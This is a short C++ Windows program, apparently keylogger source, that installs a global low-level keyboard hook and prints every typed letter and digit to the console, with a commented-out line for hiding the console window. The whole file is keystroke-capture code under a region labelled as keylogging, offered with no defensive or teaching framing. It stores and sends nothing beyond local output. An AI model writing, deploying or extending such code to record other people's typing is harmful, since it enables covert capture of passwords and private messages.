#include "stdafx.h"
#include <windows.h>
#include "axonUtil.h"
#include <string>
#include <sstream>
#include <iostream>
#include <cstdio>
using namespace std;

HHOOK hKeyboardHook;

#pragma region Kelogging
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	BOOL inKey = FALSE;
	DWORD SHIFT_key = 0;
	unsigned int vCode[40] = {0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E,
	0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A};
	char lowCase[40] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's',
	't', 'u', 'v', 'w', 'x', 'y', 'z'};
	char upCase[40] = {')', '!', '@', '#', '$', '%', '^', '&', '*', '(', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S',
	'T', 'U', 'V', 'W', 'X', 'Y', 'Z' };

	
	if ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
	{
		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;

		for (int i = 0; i < ( sizeof(vCode) / sizeof(vCode[0]) ); i++)
		{
			if (p->vkCode == vCode[i])
			{
				if (GetAsyncKeyState(VK_SHIFT) >= 0)
					cout << lowCase[i];
				else
					cout << upCase[i];
			}
		}

	}
	return(inKey ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}
#pragma endregion

int main()
{	
	HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);

	MSG msg;
	while (!GetMessage(&msg, NULL, NULL, NULL)) {    //this while loop keeps the hook
		TranslateMessage(&msg);
		DispatchMessage(&msg);
		}
	//ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false); //Hides the console window
	

    return 0;
}

